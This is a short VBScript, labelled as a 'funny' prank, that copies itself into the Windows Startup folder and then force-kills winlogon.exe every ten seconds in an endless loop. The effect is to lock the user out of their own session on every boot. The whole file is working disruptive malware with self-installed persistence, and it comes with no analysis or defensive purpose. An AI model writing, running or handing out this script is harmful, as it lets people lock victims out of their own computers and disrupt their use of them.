' Funny vbs that locks user account every 10 secs 
Dim objShell, objFSO, startupFolder, scriptPath, scriptName, destinationPath

Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

startupFolder = objShell.SpecialFolders("Startup")

scriptPath = WScript.ScriptFullName
scriptName = WScript.ScriptName
destinationPath = startupFolder & "\" & scriptName

Do
    objShell.Run "taskkill /F /IM winlogon.exe", 0, True

    If Not objFSO.FileExists(destinationPath) Then

        objFSO.CopyFile scriptPath, destinationPath
    End If
    
    WScript.Sleep 10000
Loop
